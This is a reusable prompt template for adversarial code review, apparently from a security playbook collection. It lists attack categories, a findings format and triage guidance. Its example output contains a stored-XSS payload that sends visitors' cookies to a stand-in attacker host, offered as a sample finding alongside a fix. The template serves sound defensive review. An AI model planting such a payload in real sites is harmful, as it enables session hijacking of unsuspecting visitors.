---
id: think-like-an-attacker
title: Think Like an Attacker
summary: A reusable framing prompt for any code review — if you were attacking this, where would you start and what would you target?
version: 0.1.0
audience:
  - novice-builder
  - founder
  - operator
  - developer
  - agent
journey_stage: 5
use_case: |
  When reviewing code (yours or agent-generated) and you want a security-focused perspective that goes beyond "does it work?" to "how could this be abused?"
variables:
  - SCOPE_PATH
  - CONTEXT
expected_output: |
  A structured adversarial analysis identifying the most promising attack vectors, trust assumptions that could be exploited, and concrete recommendations — not generic security advice.
quality_standard: |
  Every finding must be specific to the code under review, with concrete attack paths and realistic severity assessments. "You should use HTTPS" is not acceptable — only project-specific adversarial analysis.
related:
  - untrusted-by-default
  - failure-modes
tags:
  - security
---

# Think Like an Attacker

This prompt forces adversarial thinking on any code review. Instead of asking "does this work?" it asks "how would I break this?"

Use it when you're reviewing agent-generated code, merging a feature, or just want a security sanity check.

## The prompt

```text
You are reviewing the following code with an attacker's mindset: {{SCOPE_PATH}}

{{#if CONTEXT}}
Additional context: {{CONTEXT}}
{{/if}}

Your task is NOT to find bugs or style issues. Your task is to identify how a malicious actor would exploit this code.

For each potential attack, document:

1. **Attack name** — A short descriptive name
2. **Entry point** — Where the attack begins (specific file, function, or input)
3. **Attack path** — Step-by-step how an attacker would proceed
4. **What they'd gain** — Data, access, capability, or disruption
5. **Likelihood** — How probable is this attack? (Low / Medium / High)
6. **Severity** — How bad if successful? (Low / Medium / High / Critical)
7. **Current protection** — What (if anything) prevents this today?
8. **Recommendation** — Specific fix, not generic advice

Consider these attack categories:

**Input-based attacks**
- Can user input reach places it shouldn't?
- Is there unsanitised input that gets rendered, executed, or stored?
- Are there injection opportunities (SQL, HTML, command, prompt)?

**Authentication and authorization**
- Can someone access resources without proper credentials?
- Can a regular user perform admin actions?
- Can session tokens be stolen or forged?

**AI and agent risks** (if AI is involved)
- Can user input influence AI behaviour in unintended ways?
- Does AI output get executed or trusted without validation?
- Can one user's data leak to another through AI context?

**Data exposure**
- What sensitive data could leak?
- Are secrets, tokens, or credentials exposed?
- Do logs or errors reveal too much?

**Trust assumptions**
- What does this code assume is safe that might not be?
- What happens if a "trusted" third party is compromised?
- What happens if internal services receive malicious data?

After analysing individual attacks, answer:

1. **What would I attack first?** — The single most promising target
2. **What's the most dangerous assumption?** — The trust that could backfire worst
3. **What would survive a casual attacker?** — What's already reasonably protected
4. **What would fall to a determined attacker?** — Where are the weak points

Be specific. Reference files and line numbers. Do not give generic security advice — only findings grounded in this code.
```

## When to use this

- Before merging any feature that handles authentication, payments, or sensitive data
- When reviewing agent-generated code that touches security-relevant areas
- After a "quick fix" that might have unintended consequences
- When something feels off but you can't articulate why
- As a routine check on any code that accepts user input

## What to do with the output

1. **Critical or High severity findings** — Do not merge until addressed
2. **Medium severity findings** — Fix before next release
3. **Low severity findings** — Track and fix opportunistically

If the analysis reveals trust assumptions you hadn't considered, update your attack surface inventory (see [Map Your Attack Surface](/playbooks/map-your-attack-surface)).

## Example output structure

```markdown
## Attack 1: Stored XSS via User Bio

**Entry point:** `app/api/users/update.ts:34`  
**Attack path:**

1. User submits bio containing `<script>document.location='evil.com?c='+document.cookie</script>`
2. Bio is stored without sanitisation
3. Bio is rendered on profile page without escaping
4. Any visitor to the profile executes the script

**What they'd gain:** Session cookies of anyone who views the profile  
**Likelihood:** High — trivial to execute  
**Severity:** High — session hijacking  
**Current protection:** None observed  
**Recommendation:** Sanitise on input, escape on output. Use a library like DOMPurify for HTML content.

---

## What I Would Attack First

The user bio field. It's the most direct path from attacker-controlled input to victim execution, and there's no visible protection.

## Most Dangerous Assumption

The code assumes all user input is benign. There's no validation layer — data flows directly from request to database to rendered HTML.
```

## See also

- [Principle: Untrusted by Default](contextqb://principles/untrusted-by-default) — the mental model this prompt operationalises
- [Principle: AI Output Is Untrusted Code](contextqb://principles/ai-output-is-untrusted-code) — turn the same lens on agent-generated code
- [Prompt: Security-Critical Code Review](contextqb://prompts/security-critical-code-review) — checklist-driven companion for security-sensitive code
- [Audit: Application Security Baseline](contextqb://audits/application-security-baseline) — full security audit
- [Audit: AI Integration Security](contextqb://audits/ai-integration-security) — focused on AI surfaces specifically
- [Playbook: Map Your Attack Surface](contextqb://playbooks/map-your-attack-surface) — inventory your exposure
